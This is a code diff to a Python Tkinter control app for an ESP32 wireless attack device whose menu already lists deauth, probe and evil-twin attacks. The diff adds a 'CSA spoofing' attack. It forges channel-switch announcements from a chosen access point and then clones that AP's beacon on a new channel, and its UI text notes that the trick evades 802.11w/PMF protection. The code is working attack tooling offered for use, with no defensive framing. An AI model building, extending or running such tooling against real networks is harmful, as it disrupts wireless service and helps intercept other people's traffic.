@@ -46,6 +46,7 @@ REASONS = [
 MENU = [
     ("deauth", "Deauth 攻击"),
     ("probe", "Probe 攻击"),
+    ("csa", "CSA 欺骗"),
     ("evil", "Evil Twin"),
     ("status", "设备状态"),
     ("log", "日志"),
@@ -302,6 +303,10 @@ class DeautherApp:
         self.stats_trees = {}
         self.reason_var = tk.StringVar(value=REASONS[0][1])
         self.reason_custom_var = tk.StringVar()
+        self.csa_channel_var = tk.StringVar(value="11")
+        self.csa_count_var = tk.StringVar(value="5")
+        self.csa_hold_var = tk.StringVar(value="15")
+        self.csa_label = None
 
         root.title("ESP32 Wireless Attack 上位机")
         root.geometry("1040x700")
@@ -358,6 +363,7 @@ class DeautherApp:
         for key, label, needs_pick, hint in DEAUTH_MODES:
             self.pages[key] = self._build_mode_page(key, label, needs_pick, hint)
         self.pages["probe"] = self._build_probe_page()
+        self.pages["csa"] = self._build_csa_page()
         self.pages["evil"] = self._build_evil_page()
         self.pages["status"] = self._build_status_page()
         self.pages["log"] = self._build_log_page()
@@ -459,6 +465,60 @@ class DeautherApp:
             ),
             justify="left",
         ).pack(anchor="w", pady=(16, 0))
+        return page
+
+    def _build_csa_page(self):
+        page = self._make_page()
+        ttk.Label(page, text="CSA 欺骗（信道切换通告）", font=("", 12, "bold")).pack(
+            anchor="w", pady=(10, 4))
+        ttk.Label(
+            page,
+            text="伪造 AP 的 CSA：在目标信道上按 count 递减播报，然后跳到新信道用克隆 beacon 接应。"
+                 "CSA 不受 802.11w/PMF 保护。",
+            foreground="#777777",
+        ).pack(anchor="w", pady=(0, 8))
+
+        bar = ttk.Frame(page)
+        bar.pack(fill="x", pady=(0, 6))
+        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
+        btn.pack(side="left")
+        self.scan_btns["csa"] = btn
+        tbtn = ttk.Button(bar, text="选择目标…", width=13,
+                          command=lambda: self.open_targets(False), state="disabled")
+        tbtn.pack(side="left", padx=6)
+        self.target_btns["csa"] = tbtn
+        self.csa_label = ttk.Label(bar, text="未扫描")
+        self.csa_label.pack(side="left", padx=10)
+
+        params = ttk.Frame(page)
+        params.pack(fill="x", pady=(4, 6))
+        ttk.Label(params, text="新信道：").pack(side="left")
+        ttk.Combobox(params, textvariable=self.csa_channel_var, width=6,
+                     values=[str(c) for c in (1, 6, 11, 36, 40, 44, 48, 149, 153, 157, 161, 165)]
+                     ).pack(side="left")
+        ttk.Label(params, text="  count（倒数轮数，2–8）：").pack(side="left")
+        ttk.Spinbox(params, from_=2, to=8, width=4,
+                    textvariable=self.csa_count_var).pack(side="left")
+        ttk.Label(params, text="  hold（新信道接应秒数，1–600）：").pack(side="left")
+        ttk.Spinbox(params, from_=1, to=600, width=5,
+                    textvariable=self.csa_hold_var).pack(side="left")
+
+        actions = ttk.Frame(page)
+        actions.pack(fill="x", pady=(6, 4))
+        ttk.Button(actions, text="开始 CSA", width=14,
+                   command=self.start_csa).pack(side="left")
+        ttk.Button(actions, text="停止", width=10,
+                   command=self.csa_stop).pack(side="left", padx=8)
+
+        ttk.Label(
+            page,
+            text=("说明：\n"
+                  "• 需要在“选择目标…”里选一个 AP，新信道必须和它当前信道不同；\n"
+                  "• count 从 5 递减到 1、每 100 ms 一轮，同时发广播与单播 Action 帧 + 带 CSA IE 的 Beacon；\n"
+                  "• 倒计时结束后固件跳到新信道，用同 BSSID/SSID/RSN 的克隆 beacon 顶 hold 秒；\n"
+                  "• 底栏的 CSA 字段显示 idle / announce / hold，帧数看 STATUS 的 csaf。"),
+            justify="left",
+        ).pack(anchor="w", pady=(12, 0))
         return page
 
     def _build_evil_page(self):
@@ -656,6 +716,18 @@ class DeautherApp:
                     widget.config(text=f"共 {len(self.networks)} 个 AP　目标：#{single} {ssid}")
             else:
                 widget.config(text=f"共 {len(self.networks)} 个 AP　（全部）")
+        if self.csa_label is not None:
+            if not self.networks:
+                self.csa_label.config(text="未扫描")
+            elif single is None or str(single) not in self.networks:
+                self.csa_label.config(text=f"共 {len(self.networks)} 个 AP　目标：未选择")
+            else:
+                ssid = self.networks[str(single)]["ssid"] or "(隐藏)"
+                ch = self.networks[str(single)]["channel"]
+                self.csa_label.config(
+                    text=f"目标：#{single} {ssid}（当前 ch{ch}）→ 新信道 "
+                         f"{self.csa_channel_var.get()}")
+
         if "evil" in self.count_labels:
             widget = self.count_labels["evil"]
             if self.scanning:
@@ -743,6 +815,47 @@ class DeautherApp:
     def _joined_picked(self):
         return ",".join(sorted(self.picked, key=int))
 
+    def _csa_params(self):
+        """校验 CSA 参数；返回 (channel, count, hold)，非法时抛 ValueError。"""
+        if self.single_index is None:
+            raise ValueError("先在“选择目标…”里选一个 AP。")
+        target = self.networks.get(str(self.single_index), {})
+        ap_ch = target.get("channel")
+        try:
+            channel = int(self.csa_channel_var.get().strip(), 0)
+        except ValueError:
+            raise ValueError(f"新信道必须是整数，当前是 {self.csa_channel_var.get()!r}。")
+        if not (1 <= channel <= 14 or 36 <= channel <= 196):
+            raise ValueError("新信道必须是 1–14（2.4G）或 36–196（5G）。")
+        if ap_ch is not None and channel == int(ap_ch):
+            raise ValueError(f"新信道不能等于目标 AP 的信道（{ap_ch}）。")
+        try:
+            count = int(self.csa_count_var.get())
+            hold = int(self.csa_hold_var.get())
+        except ValueError:
+            raise ValueError("count / hold 必须是整数。")
+        if not 2 <= count <= 8:
+            raise ValueError("count 必须是 2–8（像真 AP 那样逐轮递减）。")
+        if not 1 <= hold <= 600:
+            raise ValueError("hold 必须是 1–600 秒。")
+        return channel, count, hold
+
+    def start_csa(self):
+        if not self._require_link():
+            return
+        if not self.networks:
+            messagebox.showinfo("提示", "先点“扫描 AP”。")
+            return
+        try:
+            channel, count, hold = self._csa_params()
+        except ValueError as exc:
+            messagebox.showerror("CSA 参数无效", str(exc))
+            return
+        self._send(f"CSA {self.single_index} {channel} {count} {hold}")
+
+    def csa_stop(self):
+        self._send("CSASTOP")
+
     def stop(self):
         self._send("STOP")
 
@@ -811,7 +924,8 @@ class DeautherApp:
             self.status_var.set(
                 f"模式：{mode}    Deauth 帧：{payload.get('deauth_frames', '-')}    "
                 f"Probe 帧：{payload.get('probe_frames', '-')}    "
-                f"reason：{payload.get('reason', '-')}    网络：{payload.get('networks', '-')}"
+                f"reason：{payload.get('reason', '-')}    CSA：{payload.get('csa', '-')} "
+                f"({payload.get('csaf', '-')} 帧)    网络：{payload.get('networks', '-')}"
                 f"    堆：{payload.get('heap', '-')}{band_hint}"
             )
             self.status_text.configure(state="normal")
